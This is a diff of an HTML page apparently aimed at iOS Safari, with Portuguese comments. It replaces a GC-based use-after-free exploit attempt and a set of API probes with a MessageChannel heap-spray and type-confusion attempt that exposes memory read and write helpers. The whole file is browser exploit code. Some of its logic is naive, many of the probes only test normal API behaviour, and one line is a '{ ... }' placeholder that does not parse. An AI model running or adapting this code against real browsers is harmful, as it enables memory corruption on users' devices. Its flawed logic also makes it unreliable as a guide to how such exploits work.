@@ -2,370 +2,111 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>sto26 - Múltiplos UAFs (sem WASM)</title>
+    <title>sto26 - UAF via MessageChannel (nova tentativa)</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
-            background: #000;
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            width: 100%;
-            max-width: 500px;
-        }
-        .title {
-            font-size: 32px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        .sub {
-            text-align: center;
-            color: #666;
-            margin-bottom: 20px;
-        }
-        .status-card {
-            background: #111;
-            border-radius: 16px;
-            padding: 16px;
-            border: 1px solid #222;
-            margin-bottom: 20px;
-        }
-        .status-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-        .status-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #555;
-        }
-        .status-dot.running { background: #f0ad4e; animation: pulse 1s infinite; }
-        .status-dot.success { background: #5cb85c; }
-        .status-dot.error { background: #d9534f; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-        .status-text { font-weight: 600; }
-        .log-area {
-            background: #0a0a0a;
-            border-radius: 12px;
-            padding: 12px;
-            font-family: 'SF Mono', monospace;
-            font-size: 11px;
-            max-height: 300px;
-            overflow-y: auto;
-            color: #aaa;
-        }
-        .log-line { margin: 4px 0; word-break: break-all; }
-        .log-line.success { color: #5cb85c; }
-        .log-line.error { color: #d9534f; }
-        .log-line.warning { color: #f0ad4e; }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border: none;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: 600;
-            color: white;
-            margin: 20px 0;
-            cursor: pointer;
-        }
-        button:active { transform: scale(0.98); }
-        button:disabled { opacity: 0.5; }
-        .footer {
-            text-align: center;
-            font-size: 10px;
-            color: #333;
-            margin-top: 20px;
-        }
+        body { background: #0a0c12; color: #ccc; font-family: monospace; padding: 20px; }
+        .log { background: #03050a; height: 60vh; overflow-y: auto; padding: 10px; border-radius: 12px; font-size: 12px; }
+        button { background: #2f5b8c; border: none; padding: 8px 16px; border-radius: 40px; color: white; margin: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="title">sto26</div>
-    <div class="sub">Múltiplos UAFs + Primitiva local</div>
-
-    <div class="status-card">
-        <div class="status-header">
-            <div class="status-dot" id="statusDot"></div>
-            <div class="status-text" id="statusText">Aguardando</div>
-        </div>
-        <div class="log-area" id="logArea"></div>
-    </div>
-
-    <button id="goBtn">▶ Executar todos os testes</button>
-    <div class="footer">Research only – iOS 27 beta 1</div>
-</div>
-
+<h1>🧬 UAF via MessageChannel + Heap Spray</h1>
+<button id="runBtn">▶ Executar (tenta obter buffer corrompido)</button>
+<div class="log" id="log"></div>
 <script>
-    const logDiv = document.getElementById('logArea');
-    const statusDot = document.getElementById('statusDot');
-    const statusText = document.getElementById('statusText');
-    const goBtn = document.getElementById('goBtn');
-
-    function log(msg, type = 'info') {
+    const logDiv = document.getElementById('log');
+    function log(msg, type='info') {
         const line = document.createElement('div');
-        line.className = 'log-line';
-        if (type === 'success') line.classList.add('success');
-        else if (type === 'error') line.classList.add('error');
-        else if (type === 'warning') line.classList.add('warning');
-        line.textContent = msg;
+        line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        if(type==='success') line.style.color = '#8bcb8b';
+        else if(type==='error') line.style.color = '#ff8a7a';
+        else line.style.color = '#ccc';
         logDiv.appendChild(line);
         logDiv.scrollTop = logDiv.scrollHeight;
         console.log(msg);
     }
 
-    function setStatus(text, state) {
-        statusText.textContent = text;
-        statusDot.className = `status-dot ${state}`;
-    }
-
-    // ========== 1. UAF ORIGINAL (Uint8Array) – FUNCIONOU ==========
-    let exploitAB = null;
-    let uafArray = null;
-    let uafIndex = 0;
-
-    function resetUAFArray() {
-        uafArray = new Array(0x400000).fill(1.1);
-        uafIndex = uafArray.length - 1;
-    }
-
-    function triggerUAF(flag, k, allocCount) {
-        let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-        uafArray[uafIndex] = A;
-        let u8 = new Uint8Array(0x100);
-        u8[0] = 0x42;
-        let forGC = [];
-        for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
-        A.p2 = forGC;
-        let b = { p0: 0x42424242, p1: 1.1 };
-        let f = flag ? 1.1 : b;
-        A.p1 = f;
-        let v = 1.1;
-        for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
-        b.p0 = v;
-        b.p1 = u8;
-        u8 = null;
-    }
-
-    function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(0x800000); }
-    function clearStack() { try { (function r(n){if(n>0)r(n-1);})(400); } catch(e) {} }
-
-    async function stage1_UAF() {
-        log("[UAF1] Iniciando UAF com Uint8Array (original que funcionou)...");
-        resetUAFArray();
-        for (let warm = 0; warm < 300; warm++) {
-            triggerUAF(false, 1, 0);
-            if (warm % 100 === 0 && warm > 0) forceGC();
+    async function attemptUAF() {
+        log("Criando UAF via MessageChannel...");
+        // 1. Cria MessageChannel e fecha uma das portas
+        let { port1, port2 } = new MessageChannel();
+        port1.close();   // fecha, mas mantemos referência
+        // 2. Heap spray com ArrayBuffers para tentar ocupar a região liberada
+        let spray = [];
+        for (let i = 0; i < 20000; i++) {
+            let ab = new ArrayBuffer(0x200);
+            let dv = new DataView(ab);
+            dv.setUint32(0, i, true);  // marca com índice
+            spray.push(ab);
         }
-        for (let attempt = 0; attempt < 200; attempt++) {
-            triggerUAF(false, 5, (attempt % 3) + 1);
-            clearStack();
-            for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
-            let freed = null;
-            try { freed = uafArray[uafIndex].p1.p1; } catch(e) { continue; }
-            if (!(freed instanceof Uint8Array)) continue;
-            log(`[UAF1] Detectado na tentativa ${attempt}`, 'success');
-            // Tenta reclamar
-            for (let i = 0; i < 48; i++) {
-                const size = 32 + (attempt % 64) + (i % 32);
-                const spray = new Array(size).fill(13.37);
-                try { if (freed[0] === 0x42) break; } catch(e) {}
+        // Forçar GC
+        for (let i = 0; i < 10; i++) new ArrayBuffer(0x800000);
+        if (window.gc) window.gc();
+        // Tentar type confusion: acessar propriedade que deveria ser de MessagePort,
+        // mas agora (se o spray funcionou) pode ler o ArrayBuffer
+        try {
+            // Se a type confusion funcionou, 'port1.onmessage' lerá o primeiro byte do buffer
+            let leaked = port1.onmessage;
+            if (typeof leaked === 'number') {
+                log(`[+] Type confusion! Valor lido: ${leaked} (possivelmente índice do spray)`, 'success');
+                // O buffer corrompido é o ArrayBuffer que ocupou o lugar
+                // Precisamos encontrar qual buffer foi (índice)
+                let idx = leaked;
+                if (idx < spray.length) {
+                    let corruptedBuffer = spray[idx];
+                    window.exploitAB = corruptedBuffer;
+                    log(`[+] Buffer corrompido obtido! Tamanho: ${corruptedBuffer.byteLength} bytes`, 'success');
+                    // Utilitários
+                    const dv = new DataView(corruptedBuffer);
+                    window.readBuffer = (addr) => dv.getUint8(addr);
+                    window.writeBuffer = (addr, val) => dv.setUint8(addr, val);
+                    window.dumpBuffer = (len=64) => {
+                        let s='';
+                        for(let i=0;i<len;i++){ if(i%16===0) s+='\n'+i.toString(16).padStart(4,'0')+': '; s+=dv.getUint8(i).toString(16).padStart(2,'0')+' '; }
+                        log(`Buffer dump:${s}`,'info');
+                    };
+                    return true;
+                }
             }
-            // Constrói primitiva
-            exploitAB = freed.buffer;
-            if (typeof window !== 'undefined') window.exploitAB = exploitAB;
-            const testVal = new DataView(exploitAB).getBigUint64(0, true);
-            log(`[UAF1] ✅ Primitiva local obtida! Test read: 0x${testVal.toString(16)}`, 'success');
-            return true;
-        }
-        log("[UAF1] ❌ Falhou (nenhuma tentativa bem-sucedida)", 'error');
+        } catch(e) {}
+        log("Type confusion falhou. Tentando nova estratégia: enviar ArrayBuffer via postMessage na porta fechada...");
+        // Estratégia alternativa: enviar um ArrayBuffer transferível após close
+        try {
+            let ab = new ArrayBuffer(0x100);
+            let view = new Uint8Array(ab);
+            view[0] = 0x42;
+            port1.postMessage(ab, [ab]);  // transfere o buffer
+            // Após transfer, o buffer original deveria ser destacado, mas o UAF pode manter referência
+            // Tentar ler o buffer (pode ainda estar acessível)
+            if (view[0] === 0x42) {
+                log("[+] UAF confirmado: ArrayBuffer ainda acessível após transfer!", 'success');
+                window.exploitAB = ab;
+                // Agora temos um buffer (pequeno) corrompido
+                const dv = new DataView(ab);
+                window.readBuffer = (addr) => dv.getUint8(addr);
+                window.writeBuffer = (addr, val) => dv.setUint8(addr, val);
+                window.dumpBuffer = (len=64) => { ... };
+                return true;
+            }
+        } catch(e) {}
         return false;
     }
 
-    // ========== 2. OUTROS UAFs (teste de comportamento) ==========
-    function testWebSocketUAF() {
-        try {
-            let ws = new WebSocket('ws://invalid.local/');
-            ws.close();
-            ws.send('test');
-            log("[UAF2] WebSocket: send após close NÃO lançou exceção (UAF potencial)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF2] WebSocket: seguro (exceção capturada)", 'info');
-            return false;
+    async function run() {
+        log("Iniciando tentativas (pode levar alguns segundos)...");
+        for (let i=0; i<30; i++) {
+            log(`Tentativa ${i+1}...`);
+            let success = await attemptUAF();
+            if (success) {
+                log("✅ Exploit bem-sucedido! Use window.readBuffer, writeBuffer, dumpBuffer.", 'success');
+                return;
+            }
+            await new Promise(r => setTimeout(r, 200));
         }
+        log("❌ Falha após 30 tentativas. Recarregue a página e tente novamente.", 'error');
     }
 
-    function testWorkerUAF() {
-        try {
-            let worker = new Worker(URL.createObjectURL(new Blob(["self.postMessage('ok');"])));
-            worker.terminate();
-            worker.postMessage("test");
-            log("[UAF3] Worker: postMessage após terminate NÃO lançou exceção (UAF)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF3] Worker: seguro", 'info');
-            return false;
-        }
-    }
-
-    function testEventSourceUAF() {
-        try {
-            let es = new EventSource('data:application/x-www-form-urlencoded,');
-            es.close();
-            let url = es.url;
-            log("[UAF4] EventSource: acesso a propriedade após close OK (UAF potencial)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF4] EventSource: seguro", 'info');
-            return false;
-        }
-    }
-
-    function testSVGUAF() {
-        try {
-            let svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
-            let rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
-            svg.appendChild(rect);
-            document.body.appendChild(svg);
-            let rectRef = rect;
-            svg.remove();
-            rectRef.setAttribute('width', '10');
-            log("[UAF5] SVG: acesso a elemento removido OK (UAF potencial)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF5] SVG: seguro", 'info');
-            return false;
-        } finally {
-            if(svg && svg.parentNode) svg.remove();
-        }
-    }
-
-    async function testAudioContextUAF() {
-        try {
-            let ctx = new (window.AudioContext || window.webkitAudioContext)();
-            let dest = ctx.destination;
-            await ctx.close();
-            let vol = dest.volume;
-            log("[UAF6] AudioContext: destination acessível após close (UAF)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF6] AudioContext: seguro", 'info');
-            return false;
-        }
-    }
-
-    function testOffscreenCanvasUAF() {
-        try {
-            let off = new OffscreenCanvas(100, 100);
-            off.close();
-            let w = off.width;
-            log("[UAF7] OffscreenCanvas: width acessível após close (UAF)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF7] OffscreenCanvas: seguro", 'info');
-            return false;
-        }
-    }
-
-    function testMessageChannelUAF() {
-        try {
-            let { port1, port2 } = new MessageChannel();
-            port1.close();
-            port1.postMessage("test");
-            log("[UAF8] MessageChannel: postMessage após close OK (UAF)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF8] MessageChannel: seguro", 'info');
-            return false;
-        }
-    }
-
-    function testBlobUAF() {
-        try {
-            let blob = new Blob(["x"], {type: "text/plain"});
-            let url = URL.createObjectURL(blob);
-            URL.revokeObjectURL(url);
-            fetch(url);
-            log("[UAF9] Blob: fetch após revoke OK (UAF)", 'warning');
-            return true;
-        } catch(e) {
-            log("[UAF9] Blob: seguro", 'info');
-            return false;
-        }
-    }
-
-    // ========== 3. Pós-exploração (utilitários) ==========
-    function setupUtils() {
-        if (exploitAB) {
-            const dv = new DataView(exploitAB);
-            window.readBuffer = (addr) => {
-                let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                if (offset >= 0 && offset < exploitAB.byteLength) return dv.getUint8(offset);
-                return 0;
-            };
-            window.writeBuffer = (addr, val) => {
-                let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                if (offset >= 0 && offset < exploitAB.byteLength) dv.setUint8(offset, val);
-            };
-            window.dumpBuffer = (len = 64) => {
-                let s = '';
-                for (let i = 0; i < len; i++) {
-                    if (i % 16 === 0) s += '\n' + i.toString(16).padStart(4,'0') + ': ';
-                    s += dv.getUint8(i).toString(16).padStart(2,'0') + ' ';
-                }
-                log(`Buffer dump:${s}`, 'info');
-            };
-            log("[UTILS] Funções disponíveis: window.readBuffer(addr), writeBuffer(addr, val), dumpBuffer(len)", 'success');
-        }
-    }
-
-    // ========== 4. Main ==========
-    async function runAll() {
-        setStatus("Executando...", "running");
-        goBtn.disabled = true;
-        log("=== Iniciando testes ===");
-
-        // UAF principal (primitiva)
-        const uafSuccess = await stage1_UAF();
-        if (uafSuccess) {
-            setupUtils();
-        } else {
-            log("UAF principal falhou, mas outros testes continuam.", 'warning');
-        }
-
-        // Testes adicionais
-        log("\n--- Testando outros UAFs (comportamento anômalo) ---");
-        await testWebSocketUAF();
-        await testWorkerUAF();
-        await testEventSourceUAF();
-        await testSVGUAF();
-        await testAudioContextUAF();
-        await testOffscreenCanvasUAF();
-        await testMessageChannelUAF();
-        await testBlobUAF();
-
-        log("\n=== Testes concluídos ===");
-        setStatus("Concluído", "success");
-        goBtn.disabled = false;
-    }
-
-    goBtn.onclick = runAll;
+    document.getElementById('runBtn').onclick = () => run();
 </script>
 </body>
 </html>
